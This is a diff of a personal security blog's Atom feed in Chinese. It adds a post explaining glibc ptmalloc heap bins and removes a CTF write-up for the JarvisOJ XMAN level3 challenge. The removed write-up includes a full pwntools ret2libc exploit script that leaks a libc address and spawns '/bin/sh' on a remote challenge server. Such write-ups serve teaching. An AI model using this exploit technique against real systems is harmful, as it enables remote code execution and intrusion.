@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://coldwave96.github.io/"/>
-  <updated>2020-07-01T09:26:17.891Z</updated>
+  <updated>2020-07-02T07:23:32.576Z</updated>
   <id>https://coldwave96.github.io/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>关于堆的bin结构的理解</title>
+    <link href="https://coldwave96.github.io/2020/07/02/Heap-bin/"/>
+    <id>https://coldwave96.github.io/2020/07/02/Heap-bin/</id>
+    <published>2020-07-02T05:18:20.000Z</published>
+    <updated>2020-07-02T07:23:32.576Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>&emsp;&emsp;用户申请堆空间是通过malloc函数实现的，而malloc在内核中对应的是ptmalloc。ptmalloc像是内核和用户的中间商，中间商向卖家（操作系统内核）要大量的货物（大块内存空间），然后分配给买家（用户程序）。同样的，当用户释放chunk的时候，也不是直接归还给系统，而是被ptmalloc所管理。当用户在一次请求内存空间的时候，ptmalloc会在空闲的chunk中选择合适大小的分配给用户。这种机制的好处在于可以避免频繁的系统效用，降低内存分配的开销，提高效率。</p><p>&emsp;&emsp;而ptmalloc正是通过bin结构来管理空闲堆块。它会根据空闲chunk的大小及使用状态将chunk分为4类：fast bin，small bin，large bin和unsorted bin。</p><a id="more"></a><h2 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h2><p>&emsp;&emsp;对于size较小的chunk，释放之后单独处理，被放入fast bin中。</p><ul><li><p>32位系统，fast bin中的chunk大小范围在16字节到64字节；</p></li><li><p>64位系统，fast bin中的chunk大小范围在32字节到128字节。</p></li></ul><p>&emsp;&emsp;fast bin链表采用单向链表进行连接，并且每个bin采取了LIFO策略，最近释放的chunk会被更早地分配。所以当用户申请的chunk大小在fast bin范围内时，ptmalloc会首先判断fast bin中是否有对应大小的空闲chunk，有的话就会直接分配出去。</p><p>&emsp;&emsp;fast bin范围内chunk的inuse标志位始终被置为1，即它们不会和其他被释放的chunk合并，也就不会触发Unlink操作。</p><h2 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h2><p>&emsp;&emsp;small bin中chunk大小范围的序号index从2到63，总共62个循环双向链表。</p><p>&emsp;&emsp;每个chunk的size大小用一个关系式表达是：<code>chunk_size = 2 * SIZE_SZ（4 or 8）* index</code></p><p>&emsp;&emsp;从关系式可以看出每个链表中的chunk大小是一样的，这也是堆中堆表的数据结构。并且可以发现small bin中的chunk_size与fast bin有重复，这仅是大小重复，而不是chunk重复。fast bin中的chunk也有可能被放到small bin中去。</p><p>&emsp;&emsp;此外small bin中每个bin对应的链表采用FIFO策略，所以同一个链表中先被释放的chunk会被先分配。</p><h2 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h2><p>&emsp;&emsp;large bin也是遵循FIFO策略的循环双向链表，一共有63个bin，每个bin中的chunk大小不一致，但处于一定区间范围内。32位系统中chunk_size &gt;= 512字节。</p><h2 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h2><p>&emsp;&emsp;* unsorted bin可以看作空闲chunk回归其所属bin之前的缓冲区，该bin只有一个遵循FIFO策略的循环双向链表，且其中的free chunk处于乱序状态。unsorted bin暂时存储free后的chunk，一段时间后会将chunk放入对应的bin中去。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;用户申请堆空间是通过malloc函数实现的，而malloc在内核中对应的是ptmalloc。ptmalloc像是内核和用户的中间商，中间商向卖家（操作系统内核）要大量的货物（大块内存空间），然后分配给买家（用户程序）。同样的，当用户释放chunk的时候，也不是直接归还给系统，而是被ptmalloc所管理。当用户在一次请求内存空间的时候，ptmalloc会在空闲的chunk中选择合适大小的分配给用户。这种机制的好处在于可以避免频繁的系统效用，降低内存分配的开销，提高效率。&lt;/p&gt;
+&lt;p&gt;&amp;emsp;&amp;emsp;而ptmalloc正是通过bin结构来管理空闲堆块。它会根据空闲chunk的大小及使用状态将chunk分为4类：fast bin，small bin，large bin和unsorted bin。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="Theories" scheme="https://coldwave96.github.io/categories/Theories/"/>
+    
+      <category term="Assembler" scheme="https://coldwave96.github.io/categories/Theories/Assembler/"/>
+    
+    
+      <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
+    
+      <category term="Heap" scheme="https://coldwave96.github.io/tags/Heap/"/>
+    
+  </entry>
   
   <entry>
     <title>Unlink原理和简单利用</title>
@@ -544,37 +572,6 @@
       <category term="Web" scheme="https://coldwave96.github.io/tags/Web/"/>
     
       <category term="Raven Series" scheme="https://coldwave96.github.io/tags/Raven-Series/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XMAN level3 の Write-Up</title>
-    <link href="https://coldwave96.github.io/2020/05/20/XMAN-level3/"/>
-    <id>https://coldwave96.github.io/2020/05/20/XMAN-level3/</id>
-    <published>2020-05-20T06:46:04.000Z</published>
-    <updated>2020-06-30T07:14:51.058Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&emsp;&emsp;这是JarvisOJ的PWN题部分[XMAN]level3的Write-Up，题目还是有点难度。题目中涉及到二次覆盖，ret2libc方法的使用，延迟绑定技术的理解和运用等知识点，建议先认真了解一下ROP链和延迟绑定技术原理。可以参考之前写的两篇Blog：<a href="https://coldwave96.github.io/2020/05/19/ret2win/">ROP Emporium の ret2win</a>和<a href="https://coldwave96.github.io/2020/05/19/LazyBinding/">ret2libc &amp;&amp; Lazy Binding</a>。</p><a id="more"></a><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>&emsp;&emsp;程序运行截图：</p><p><img src="/img/XMAN-level3/XMAN1.png" alt=""></p><p>&emsp;&emsp;checksec：32位程序，开启DEP保护</p><p><img src="/img/XMAN-level3/XMAN2.png" alt=""></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>&emsp;&emsp;将程序拖到hopper disassembler中去发现程序中依然存在vulnerable_function函数，但是不再有system函数和‘/bin/sh’的字符串。</p><p><img src="/img/XMAN-level3/XMAN3.png" alt=""></p><p>&emsp;&emsp;但是同时题目也给了libc-2.19.so，把该文件也拖到hopper中发现system函数：</p><p><img src="/img/XMAN-level3/XMAN4.png" alt=""></p><p>&emsp;&emsp;通过ROPgadget找到libc-2.19.so中’/bin/sh’字符串的位置：</p><p><img src="/img/XMAN-level3/XMAN5.png" alt=""></p><p>&emsp;&emsp;参考之前的栈溢出系列以及<a href="https://coldwave96.github.io/2020/05/19/ret2win/">ROP Emporium の ret2win</a>，现在的思路就是vulnerable_function函数溢出去执行lib-2.19.so文件中的system函数，同时传入参数’/bin/sh’。</p><p>&emsp;&emsp;理想中的栈布局为：</p><p><img src="/img/XMAN-level3/XMAN6.png" alt=""></p><p>&emsp;&emsp;说是vulnerable_function函数溢出，其实实际上是read函数溢出。所以我们需要将read函数的返回地址覆盖为system函数的入口地址，然后根据函数调用规则，设置一下system函数的返回地址为0xdeadbeef（毫无意义的地址），最后是system函数的参数即‘bin/sh’字符串的地址。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>&emsp;&emsp;虽然我们通过libc-2.19.so文件可以得到system函数和’/bin/sh’字符串的偏移地址，但是不知道其在内存中的实际地址，所以我们需要想办法找到system函数和’/bin/sh’字符串在内存中的实际地址。</p><p>&emsp;&emsp;假设这样一个情况，我们已经知道test函数是通过延迟绑定（具体情况了解<a href="https://coldwave96.github.io/2020/05/19/LazyBinding/">ret2libc &amp;&amp; Lazy Binding</a>）调用libc.so中的test函数实现的，并且我们知道test函数在内存中的实际地址test_addr及其在libc.so中的偏移地址test_libc。</p><p>&emsp;&emsp;此时我们想直接调用一个程序中没但是存在于libc.so中的函数func，那么我们可以得到这样一个逻辑等式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func_addr - func_libc &#x3D; test_addr - test_libc</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;即函数在内存中地址和在libc中偏移地址两者的差相等，这个值可以理解为libc文件加载到内存中的基址。</p><p>&emsp;&emsp;根据这个题目中的情况，test函数我们选择write函数，替换func函数的位置即可获取system函数和’/bin/sh’字符串在内存中的实际地址。</p><p>&emsp;&emsp;首先我们要泄露获取write函数的真实地址，这个可以通过打印write在got表中的地址实现。</p><p>&emsp;&emsp;为了输出write_got对应的实际地址，需要构造下面的栈布局：</p><p><img src="/img/XMAN-level3/XMAN7.png" alt=""></p><p>&emsp;&emsp;将read函数的返回地址覆盖为write_plt，设置write函数返回地址为vulnerable_function函数入口地址（原因下面会提到）。</p><p>&emsp;&emsp;之后是<code>write(int fd,const void*buf,size_t count)</code>函数的3个参数：</p><ul><li><p>第一个参数是STDIN_FILENO即文件描述符，一般定义为0, 1，2；分别代表stdin(0，标准输入)，stdout(1，标准输出)，stderr(2，标准出错)</p></li><li><p>第二个参数是BUF即写入的字符串</p></li><li><p>第三个参数是每次写入的字节数</p></li></ul><p>&emsp;&emsp;所以本次题目中write函数对应的3个参数分别为1，write_got和4。</p><p>&emsp;&emsp;这样我们就可以得到write函数实际地址，且由于每次程序运行我们获取到的write函数的地址是变化的，所以我们需要把信息泄漏和获取服务器控制权限在一次网络连接中完成。</p><p>&emsp;&emsp;实现方法是借助于两次缓冲区溢出，第一次缓冲区溢出泄漏write的地址之后，我们让EIP再次跳转到vulnerable_function来执行，这样就可以接着进行第二次缓冲区溢出的过程，此时执行<code>system(&quot;/bin/sh&quot;)</code>即可。</p><p>&emsp;&emsp;运行结果：</p><p><img src="/img/XMAN-level3/XMAN8.png" alt=""></p><h2 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h2><p>&emsp;&emsp;本地运行时优先装在本地系统中的libc库，导致实际装载库并非题目给出的lib-2.19.so文件。这样会造成本地地址错误，无法成功获得shell，本地可以通过添加一个判断模块解决这个问题，远程不存在这个问题。</p><p>&emsp;&emsp;EXP代码（已添加对加载的libc文件做判断的模块）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span> <span class="comment"># 控制执行环境，0为远程，1为本地</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">sh = process(<span class="string">'./level3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9879</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">writeplt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">writegot = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line"></span><br><span class="line">writelibc = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">syslibc = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">shelllibc = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(writeplt) + p32(vuln_addr) + p32(<span class="number">1</span>) + p32(writegot) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">sys_addr = write_addr - writelibc + syslibc</span><br><span class="line">shell_addr = write_addr - writelibc + shelllibc</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(shell_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;这是JarvisOJ的PWN题部分[XMAN]level3的Write-Up，题目还是有点难度。题目中涉及到二次覆盖，ret2libc方法的使用，延迟绑定技术的理解和运用等知识点，建议先认真了解一下ROP链和延迟绑定技术原理。可以参考之前写的两篇Blog：&lt;a href=&quot;https://coldwave96.github.io/2020/05/19/ret2win/&quot;&gt;ROP Emporium の ret2win&lt;/a&gt;和&lt;a href=&quot;https://coldwave96.github.io/2020/05/19/LazyBinding/&quot;&gt;ret2libc &amp;amp;&amp;amp; Lazy Binding&lt;/a&gt;。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
-    
-      <category term="JarvisOJ" scheme="https://coldwave96.github.io/categories/WriteUPs/JarvisOJ/"/>
-    
-    
-      <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
-    
-      <category term="ROP" scheme="https://coldwave96.github.io/tags/ROP/"/>
-    
-      <category term="XMAN" scheme="https://coldwave96.github.io/tags/XMAN/"/>
-    
-      <category term="Stack" scheme="https://coldwave96.github.io/tags/Stack/"/>
     
   </entry>
   
